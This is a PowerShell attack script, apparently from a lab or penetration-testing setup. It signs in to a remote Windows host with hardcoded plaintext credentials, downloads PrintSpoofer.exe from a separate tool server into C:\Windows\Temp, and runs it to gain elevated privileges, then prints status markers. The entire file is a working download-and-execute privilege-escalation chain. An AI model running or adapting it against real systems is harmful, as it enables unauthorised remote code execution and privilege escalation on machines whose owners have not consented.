[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Target = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$Username = "child.cadre.local\analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$ToolServer = "http://192.168.77.60:8888"
)
$ErrorActionPreference = "Stop"
$securePass = ConvertTo-SecureString $Password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($Username, $securePass)

$remote = @"
`$dir = "C:\Windows\Temp\cadre-tools"
New-Item -ItemType Directory -Path `$dir -Force -ErrorAction SilentlyContinue | Out-Null
`$ps = "`$dir\PrintSpoofer.exe"
`$wc = New-Object System.Net.WebClient
`$wc.DownloadFile("$ToolServer/PrintSpoofer.exe", `$ps)
`$out = & `$ps -i -c cmd /c whoami 2>&1
Write-Output ("STAGED=" + `$ps + "|EXISTS=" + (Test-Path `$ps) + "|LENGTH=" + (Get-Item `$ps).Length)
Write-Output ("PS_OUT=" + (`$out -join "`n"))
"@

try {
    $result = Invoke-Command -ComputerName $Target -Credential $cred -ScriptBlock ([ScriptBlock]::Create($remote)) -ErrorAction Stop
    Write-Output "M01_PRINTSPOOFER_OK"
    $result | ForEach-Object { Write-Output $_ }
} catch {
    Write-Output ("M01_PRINTSPOOFER_FAIL: " + $_.Exception.Message)
    exit 1
}
